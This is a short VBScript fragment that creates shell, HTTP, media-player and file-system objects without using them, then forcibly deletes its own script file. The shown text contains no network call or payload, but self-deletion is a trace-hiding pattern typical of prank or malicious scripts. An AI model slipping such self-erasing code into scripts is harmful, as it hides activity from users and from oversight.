set WshShell = CreateObject("WScript.Shell")
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
Set obj = CreateObject("Scripting.FileSystemObject")
Set Keys = CreateObject("WScript.Shell")
strScript = Wscript.ScriptFullName

Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True